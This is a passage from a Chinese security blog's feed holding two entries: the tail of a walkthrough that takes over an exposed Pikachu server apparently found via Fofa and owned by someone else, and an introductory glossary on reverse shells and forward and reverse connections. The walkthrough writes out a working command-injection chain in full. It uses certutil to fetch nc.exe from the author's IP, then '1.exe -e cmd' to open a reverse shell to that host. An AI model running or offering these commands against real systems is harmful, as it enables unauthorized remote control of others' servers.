(ywhack.com)</a>上搜索</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331174137541.png" alt="image-20240331174137541"></p><p>接着去pikachu服务器上执行生成的命令，从我的服务器上下载nc.exe，并命名为1.exe</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&amp;certutil.exe -urlcache -split -f http://<span class="number">47</span>.<span class="number">109</span>.<span class="number">189</span>.<span class="number">205</span>:<span class="number">80</span>/nc.exe <span class="number">1</span>.exe</span><br></pre></td></tr></table></figure><p>额。。。。。。由于做到一半，别人把服务器关了，我又找不到第二个有该漏洞的服务器，所以以下图片源自网络，如有侵权，请联系我删除</p><p>输入127.0.0.1&amp;dir，发现出现1.exe,所以成功让服务器下载到nc.exe</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331181603800.png" alt="image-20240331181603800"></p><h2 id="6-在本地服务器上开启监听"><a href="#6-在本地服务器上开启监听" class="headerlink" title="6.在本地服务器上开启监听"></a>6.在本地服务器上开启监听</h2><p>输入nc -lvvp 5566，开放5566端口进行监听</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331181734111.png" alt="image-20240331181734111"></p><h2 id="7-反弹回显，拿到pikachu服务器控制权"><a href="#7-反弹回显，拿到pikachu服务器控制权" class="headerlink" title="7.反弹回显，拿到pikachu服务器控制权"></a>7.反弹回显，拿到pikachu服务器控制权</h2><p>输入127.0.0.1 &amp; 1.exe -e cmd 47.109.189.205 5566（47.109.189.205为自己服务器的ip），拿到服务器的控制权</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331182108462.png" alt="image-20240331182108462"></p><font color ='red'>虽然拿到服务器控制权，但是不要搞破坏，学习为主。</font>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> Web </category>
          
          <category> 实战训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D1基础入门-操作系统安全&amp;&amp;基础名词解释&amp;&amp;反弹Shell</title>
      <link href="/post/235b7e6b.html"/>
      <url>/post/235b7e6b.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ol><li><p>本博客仅用于个人复习和学习，无商业用途</p></li><li><p>遇到问题，优先在本页搜索，检查是否有相关教程</p></li><li>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者以及本博客无关</li></ol><h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><p>渗透入门，第一步先要了解基础名词，以方便我们在阅读各种文章的时候能清楚的知道在干什么，便于我们更好地了解到操作究竟是什么。以下是一些常见的有关操作系统和防火墙的基础名词</p><ul><li>POC：全称“Proof of Concept”，中文“概念验证”，常指一段漏洞的证明代码</li><li>EXP：“Exploit”，中文“利用”指利用漏洞进行攻击的动作</li><li>Payload：“有效载荷”，指成功exploit后，真正在目标系统执行的代码或指令</li><li>Shellcode：漏洞的利用代码，和POC类似</li><li>Webshell：专门针对于Web的后门</li><li>木马：属于恶意程序，主要针对于控制电脑</li><li>病毒：属于恶意程序，主要用来破坏系统</li><li>反弹/回显：当你拿到一个权限，可以将权限移到其他设备，将它反弹过去</li><li>跳板：中介的意思，打个比方，我是A，我想认识C，但是我只认识B，那么我可以通过B去认识C，就是说A通过B以B为跳板去认识到C</li><li>黑白盒测试：黑盒测试除目标外，什么都没有；白盒测试是网上有相关的源码，可以通过源码进行分析，从而进行渗透</li><li>撞库：撞库就是网上泄露出来的一些数据库，那么这些数据库中有真实明显和密码等，那么可以通过对数据库的收集查询，去查询有没有这个人，看看他以前设置过什么密码，看看他这个密码到底是什么含义，然后我们再尝试去其他每天以他账户去和密码登录看有没有能成功的</li><li>ATT&amp;CK：<a href="https://attack.mitre.org/matrices/enterprise/">Matrix - Enterprise | MITRE ATT&amp;CK®</a>（一些网络术语的集合的网站，个人强推）</li></ul><h2 id="操作系统-用途-amp-命令-amp-权限-amp-用户-amp-防火墙"><a href="#操作系统-用途-amp-命令-amp-权限-amp-用户-amp-防火墙" class="headerlink" title="操作系统-用途&amp;命令&amp;权限&amp;用户&amp;防火墙"></a>操作系统-用途&amp;命令&amp;权限&amp;用户&amp;防火墙</h2><h3 id="WIndows-amp-Linux常见命令："><a href="#WIndows-amp-Linux常见命令：" class="headerlink" title="WIndows&amp;Linux常见命令："></a>WIndows&amp;Linux常见命令：</h3><p><a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">【3】web安全入门篇-渗透测试中常用的命令_web安全入门篇 渗透测试中常用的命令-CSDN博客</a></p><p>Waf：Web Application FireWall，专门针对于Web的防火墙</p><h2 id="实用案例"><a href="#实用案例" class="headerlink" title="实用案例"></a>实用案例</h2><h3 id="1-文件上传下载-解决无图形化-amp-解决数据传输"><a href="#1-文件上传下载-解决无图形化-amp-解决数据传输" class="headerlink" title="1.文件上传下载-解决无图形化&amp;解决数据传输"></a>1.文件上传下载-解决无图形化&amp;解决数据传输</h3><p>相关命令的生成网站：<a href="https://forum.ywhack.com/bountytips.php?download">[~]#棱角 ::Edge.Forum* (ywhack.com)</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Linux ：wget curl python ruby perl java等</span><br><span class="line">Windows: PowerShell Certutil Bitsadmin msiexec</span><br></pre></td></tr></table></figure><h3 id="2-反弹Shell命令-解决数据回显-amp-解决数据通信"><a href="#2-反弹Shell命令-解决数据回显-amp-解决数据通信" class="headerlink" title="2.反弹Shell命令-解决数据回显&amp;解决数据通信"></a>2.反弹Shell命令-解决数据回显&amp;解决数据通信</h3><p>目的：解决交互式命令无回显的情况，部分交互式活动需要回显才能进行下一步操作</p><h3 id="3-防火墙绕过-正向连接-amp-反向连接-amp-内网服务器"><a href="#3-防火墙绕过-正向连接-amp-反向连接-amp-内网服务器" class="headerlink" title="3.防火墙绕过-正向连接&amp;反向连接&amp;内网服务器"></a>3.防火墙绕过-正向连接&amp;反向连接&amp;内网服务器</h3><p>正向连接：受害主机监听一个端口，由控制主机主动去连接受害主机的过程</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331113811332.png" alt="image-20240331113811332"></p><p>即：<font color="red">攻击机主动连接被攻击机</font></p><p>反向连接：反向连接是控制主机监听一个端口，由受害主机反向去连接控制主机的过程，适用于受害主机出网（或出网且没有公网ip）的情况。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331113906001.png" alt="image-20240331113906001"></p><p>即：<font color="red">被攻击者主动连接攻击机</font></p><p>内网服务器：只需要知道内网中的主机可以找到服务器（ping成功），服务器找不到内网中的主机（因为不同的内网中的地址可能是一样的，服务器无法甄别）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331114058029.png" alt="image-20240331114058029"></p><h2 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h2><p>Fofa拿下Pikachu服务器：详情见下一篇博客</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 系统安全 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统安全 </tag>
            
            <tag> 防火墙绕过 </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
